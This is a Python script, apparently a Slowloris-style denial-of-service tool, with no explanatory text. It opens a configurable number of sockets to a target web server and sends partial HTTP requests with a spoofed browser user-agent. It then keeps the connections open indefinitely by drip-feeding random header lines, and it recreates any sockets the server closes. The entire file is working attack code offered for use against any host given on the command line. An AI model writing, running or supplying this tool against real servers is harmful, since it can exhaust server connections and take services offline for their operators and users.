import sys
import random
import socket
import time
from progress.bar import Bar

regular_headers = [
            "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
                "Accept-language: en-US,en,q=0.5"
                ]

def init_socket(ip,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((ip,int(port)))
    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0,2000)).encode('UTF-8'))
    for header in regular_headers:
        s.send('{}\r\n'.format(header).encode('UTF-8'))
    return s

def main():
    if len(sys.argv)<5:
        print("Usage: {} example.com 80 100 10".format(sys.argv[0]))
        return
    ip = sys.argv[1]
    port = sys.argv[2]
    socket_count= int(sys.argv[3])
    bar = Bar('\033[1;32;40m Creating Sockets...', max=socket_count)
    timer = int(sys.argv[4])
    socket_list=[]
    for _ in range(int(socket_count)):
        try:
            s=init_socket(ip,port)
        except socket.error:
            break
        socket_list.append(s)
        bar.next()
    bar.finish()
    while True:
        print("\033[0;37;40m Sending Keep-Alive Headers to {}".format(len(socket_list)))
        for s in socket_list:
            try:
                s.send("X-a {}\r\n".format(random.randint(1,5000)).encode('UTF-8'))
            except socket.error:
                socket_list.remove(s)
        for _ in range(socket_count - len(socket_list)):
            print("\033[1;34;40m {}Re-creating Socket...".format("\n"))
            try:
                s=init_socket(ip,port)
                if s:
                    socket_list.append(s)
            except socket.error:
                break
        time.sleep(timer)
if __name__=="__main__":
    main()
